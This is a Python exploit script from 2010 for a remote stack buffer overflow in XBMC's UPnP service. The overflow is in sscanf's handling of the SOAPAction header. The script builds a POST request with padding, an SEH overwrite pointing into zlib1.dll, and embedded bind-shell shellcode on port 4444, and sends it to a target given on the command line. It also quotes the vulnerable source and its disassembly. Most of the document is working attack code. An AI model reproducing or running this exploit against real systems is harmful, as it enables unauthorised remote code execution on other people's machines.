#!/usr/bin/env python 

'''                   - XBMC upnp Remote Buffer Overflow -
=========================================================================
! Exploit Title: Xbmc soap_action_name post upnp sscanf buffer overflow !
=========================================================================
Date: 28th October 2010
=======================
Author: n00b  Realname: *carl cope* 
===================================
Software Link: http://xbmc.org/download/
========================================
Version: All versions are affected.
===================================
Tested on: Windows xp sp3,Vista sp2.
XBMC 9.04.1r20672 compiled june 2 2009. <--Version tested.
----------------------------------------------------------


-Description-
Well i had a little time to spare so i decided to revisit the
xbmc application and give it another look over which is a good
thing as i just have not had to time to work on exploit development 
lately and have to put more important things first unfortunately.

I decided to test the upnp protocol that was built into xbmc using the
Platinum UPnP SDK.And come across a sscanf buffer overflow
as you can see in the source code at the bottom of this exploit
that 100 bytes is allocated into a temp stack and then passed to
the sscanf function with no bounds check in place then its finally 
passed to PLT_HttpHelper::ParseBody which reads the xml body and parse it.
I've tested this exploit on windows and linux both work (Read comments).

All versions of xbmc where tested even the Dharma Beta 3 release is
also exploitable.But as ive worked with the xbmc developers before i 
know it will be fixed and patched as soon as i have informed them
great guys unlike other vendors i've worked with in the past.

I know the vulnerable function was marked with FIX ME = no sscanf.
They must have either missed it or have not got round to fixing this
yet.(See bottom of exploit for code)

The buffer overflow exists because of the vulnerable sdk used in the 
xbmc application.All versions of xbmc are exploitable but version 9.11
modules is compiled with seh protection.And i know previous release 
loaded the zlib1 module which was not compiled with safe seh.


See poc code for information and list of vendors.!!

-Description-


----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.
 
I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!
'''

import sys, socket 
import struct


#Windows version does not change port every time its restarted.!!
#linux version changes port every time xbmc is restarted.!!

port = 52569 #You will have to find it on vuln server.
host = sys.argv[1] 

'''          !!IMPORTATNT!!                       
The UUID must be set i've hardcoded this 
to make it easy to replace with the victim UUID
you can get the UUID number from the server
by issuing a get request to the vulnerable server
on port 00000 you can use a web browser to do this.
example = http://127.0.0.1:00000


-Note-
Just a side note the port is random and once the xbmc
application is installed the UUID will be set up along 
with the port number at installation so you will have to 
do a port scan to find what port the service is running
on but once its found it will be on that port till it 
is reinstalled.Also the UUID will stay the same.

Universally Unique Identifier
---------------------------------------------------
XML example
<UDN>
uuid:0970aa46-ee68-3174-d548-44b656447658
</UDN> 
---------------------------------------------------
-Note-

I was not going to write an xml paraser just for this
when a web browser and a set of eyes can do it.:)

Xbmc media player uses the Platinum UPnP SDK 
http://www.plutinosoft.com/platinum
'''

#Create upnp request and place it in Request !!
Start_url ='AVTransport/'
Uuid = '1edcbdab-e75b-57fe-dbfa-55cc24ee630c' #Replace with the vuln server's Universally Unique Identifier. 
End_url ='/control.xml HTTP/1.1\n'
Soap = 'SOAPACTION: "urn:schemas-upnp-org:service:AVTransport:1#'
Junk_buffer1 = 'A'*128
Junk_buffer2 = 'B'*100

###The same address i used for the last xbmc exploits.
###/SafeSEH Module Scanner, item 55
# SEH mode=/SafeSEH OFF
# Base=0x62e80000
# Limit=0x62e97000
# Module Name=C:\Program Files\XBMC\zlib1.dll
###
###This was found in the module zlib1 and is universal.
#62E83BAC   5B               POP EBX
#62E83BAD   5D               POP EBP
#62E83BAE  ^E9 CDD9FFFF      JMP zlib1.compressBound

Pointer_To_Next_SEH = struct.pack('<L',0x909006eb)
SE_Handler = struct.pack('<L',0x62E83BAC)
Content_type = '\nCONTENT-TYPE:text/xml; charset="utf-8"\n'
Host = 'HOST: 192.168.1.2:50988\n'
Content_length = 'Content-Length: 345'

Shell_code=(#/*win32_bind -  EXITFUNC=seh LPORT=4444 Size=696
            #Encoder=Alpha2 http://metasploit.com */
    "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x37\x49\x49\x49\x49\x49"
    "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x69"
    "\x58\x50\x30\x42\x30\x42\x6b\x42\x41\x79\x32\x42\x42\x32\x41\x42"
    "\x42\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x4d\x39\x39\x6c\x31"
    "\x7a\x4a\x4b\x72\x6d\x59\x78\x78\x79\x59\x6f\x49\x6f\x79\x6f\x45"
    "\x30\x4c\x4b\x70\x6c\x61\x34\x34\x64\x6c\x4b\x71\x55\x77\x4c\x4c"
    "\x4b\x63\x4c\x43\x35\x41\x68\x56\x61\x68\x6f\x4e\x6b\x70\x4f\x56"
    "\x78\x6e\x6b\x51\x4f\x65\x70\x77\x71\x5a\x4b\x31\x59\x6e\x6b\x47"
    "\x44\x6e\x6b\x45\x51\x6a\x4e\x75\x61\x6b\x70\x6c\x59\x6e\x4c\x4d"
    "\x54\x4f\x30\x31\x64\x54\x47\x59\x51\x39\x5a\x46\x6d\x77\x71\x39"
    "\x52\x78\x6b\x6b\x44\x57\x4b\x73\x64\x51\x34\x71\x38\x30\x75\x6d"
    "\x35\x6c\x4b\x71\x4f\x74\x64\x73\x31\x78\x6b\x51\x76\x4c\x4b\x74"
    "\x4c\x70\x4b\x4e\x6b\x51\x4f\x77\x6c\x36\x61\x4a\x4b\x43\x33\x56"
    "\x4c\x4e\x6b\x4c\x49\x30\x6c\x47\x54\x45\x4c\x31\x71\x78\x43\x30"
    "\x31\x4b\x6b\x50\x64\x6c\x4b\x50\x43\x70\x30\x4e\x6b\x57\x30\x34"
    "\x4c\x4e\x6b\x32\x50\x55\x4c\x6c\x6d\x4e\x6b\x41\x50\x63\x38\x61"
    "\x4e\x55\x38\x4e\x6e\x50\x4e\x66\x6e\x4a\x4c\x50\x50\x49\x6f\x6e"
    "\x36\x52\x46\x36\x33\x70\x66\x30\x68\x44\x73\x65\x62\x30\x68\x44"
    "\x37\x73\x43\x35\x62\x31\x4f\x71\x44\x4b\x4f\x38\x50\x45\x38\x5a"
    "\x6b\x78\x6d\x6b\x4c\x75\x6b\x56\x30\x79\x6f\x6b\x66\x61\x4f\x4f"
    "\x79\x6b\x55\x43\x56\x4c\x41\x7a\x4d\x37\x78\x35\x52\x66\x35\x50"
    "\x6a\x34\x42\x79\x6f\x58\x50\x41\x78\x78\x59\x67\x79\x4c\x35\x6e"
    "\x4d\x73\x67\x79\x6f\x4e\x36\x50\x53\x46\x33\x76\x33\x42\x73\x51"
    "\x43\x53\x73\x70\x53\x77\x33\x56\x33\x6b\x4f\x78\x50\x65\x36\x43"
    "\x58\x66\x71\x31\x4c\x73\x56\x33\x63\x6c\x49\x59\x71\x7a\x35\x30"
    "\x68\x4e\x44\x36\x7a\x62\x50\x39\x57\x76\x37\x6b\x4f\x6b\x66\x43"
    "\x5a\x32\x30\x72\x71\x32\x75\x39\x6f\x58\x50\x30\x68\x39\x34\x4e"
    "\x4d\x66\x4e\x4a\x49\x51\x47\x4b\x4f\x49\x46\x66\x33\x62\x75\x79"
    "\x6f\x4a\x70\x62\x48\x4d\x35\x33\x79\x6b\x36\x71\x59\x66\x37\x4b"
    "\x4f\x5a\x76\x76\x30\x50\x54\x70\x54\x70\x55\x4b\x4f\x6e\x30\x4a"
    "\x33\x30\x68\x4b\x57\x43\x49\x38\x46\x74\x39\x63\x67\x6b\x4f\x58"
    "\x56\x61\x45\x4b\x4f\x6e\x30\x51\x76\x41\x7a\x65\x34\x42\x46\x31"
    "\x78\x30\x63\x62\x4d\x6f\x79\x6b\x55\x33\x5a\x36\x30\x56\x39\x31"
    "\x39\x48\x4c\x4f\x79\x6d\x37\x73\x5a\x33\x74\x6b\x39\x6d\x32\x67"
    "\x41\x59\x50\x6c\x33\x6c\x6a\x79\x6e\x33\x72\x54\x6d\x49\x6e\x70"
    "\x42\x34\x6c\x6e\x73\x6c\x4d\x30\x7a\x34\x78\x4c\x6b\x4c\x6b\x4c"
    "\x6b\x42\x48\x50\x72\x39\x6e\x6d\x63\x52\x36\x49\x6f\x61\x65\x50"
    "\x44\x49\x6f\x7a\x76\x63\x6b\x71\x47\x31\x42\x73\x61\x51\x41\x66"
    "\x31\x30\x6a\x44\x41\x31\x41\x63\x61\x71\x45\x32\x71\x59\x6f\x6e"
    "\x30\x70\x68\x4c\x6d\x6e\x39\x53\x35\x7a\x6e\x41\x43\x49\x6f\x79"
    "\x46\x52\x4a\x6b\x4f\x6b\x4f\x65\x67\x4b\x4f\x7a\x70\x6e\x6b\x30"
    "\x57\x59\x6c\x6d\x53\x6a\x64\x50\x64\x39\x6f\x5a\x76\x52\x72\x39"
    "\x6f\x5a\x70\x50\x68\x58\x70\x6f\x7a\x54\x44\x63\x6f\x52\x73\x4b"
    "\x4f\x6a\x76\x49\x6f\x4e\x30\x69"
)

# create a socket object called 'c' 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# connect to the socket 
c.connect((host, port)) 

Request = (Start_url + Uuid + End_url + Soap + Junk_buffer1 + Pointer_To_Next_SEH +
 SE_Handler + Shell_code + Junk_buffer2 + Content_type + Host + Content_length)

# create a file-like object to read 
fileobj = c.makefile('r', 0) 
 
fileobj.write("POST /"+Request+"") 




#                  -Vulnerable source code-
# This information was found using windows 7 + Visual c++ 2010 express.

# .\xbmc\xbmc\lib\libUPnP\Platinum\Source\Core\PltDeviceHost.cpp

# /*----------------------------------------------------------------------
# |   PLT_DeviceHost::ProcessPostRequest
# +---------------------------------------------------------------------*/
# NPT_Result
# PLT_DeviceHost::ProcessHttpPostRequest(NPT_HttpRequest&              request,
                                       # const NPT_HttpRequestContext& context,
                                       # NPT_HttpResponse&             response) 
# {
    # NPT_Result                res;
    # NPT_String                service_type;
    # NPT_String                str;
    # NPT_XmlElementNode*       xml = NULL;
    # NPT_String                soap_action_header;
    # PLT_Service*              service;
    # NPT_XmlElementNode*       soap_body;
    # NPT_XmlElementNode*       soap_action;
    # const NPT_String*         attr;
    # PLT_ActionDesc*           action_desc;
    # PLT_ActionReference       action;
    # NPT_MemoryStreamReference resp(new NPT_MemoryStream);
    # NPT_String                ip_address  = context.GetRemoteAddress().GetIpAddress().ToString();
    # NPT_String                method      = request.GetMethod();
    # NPT_String                url         = request.GetUrl().ToRequestString(true);
    # NPT_String                protocol    = request.GetProtocol();

    # if (NPT_FAILED(FindServiceByControlURL(url, service, true)))
        # goto bad_request;

    # if (!request.GetHeaders().GetHeaderValue("SOAPAction"))
        # goto bad_request;

    # // extract the soap action name from the header
    # soap_action_header = *request.GetHeaders().GetHeaderValue("SOAPAction");
    # soap_action_header.TrimLeft('"');
    # soap_action_header.TrimRight('"');
    # char prefix[200];
    # char soap_action_name[100];                    <--- 100 bytes allocated for the soap action name.
    # int  ret;
    # //FIXME: no sscanf
    # ret = sscanf(soap_action_header, "%[^#]#%s",   <--- 
                 # prefix,                           <--- Bad very Bad.
                 # soap_action_name);                <--- 
    # if (ret != 2)
        # goto bad_request;

    # // read the xml body and parse it
    # if (NPT_FAILED(PLT_HttpHelper::ParseBody(request, xml))) <--- BOOOM I WIN!!
        # goto bad_request;

# Disassembly of vulnerable function.!!
# ==================================
# 025D2D23  lea         edx,[ebp-1F4h]  
# 025D2D29  push        edx  
# 025D2D2A  lea         eax,[ebp-188h]  
# 025D2D30  push        eax  
# 025D2D31  push        2F5E404h  
# 025D2D36  lea         ecx,[ebp-44h]  
# 025D2D39  call        NPT_String::operator char const * (1B1840Eh)  
# 025D2D3E  push        eax  
# 025D2D3F  call        @ILT+120575(_sscanf) (1AF7704h)  
# 025D2D44  add         esp,10h  
# 025D2D47  mov         dword ptr [ebp-1FCh],eax  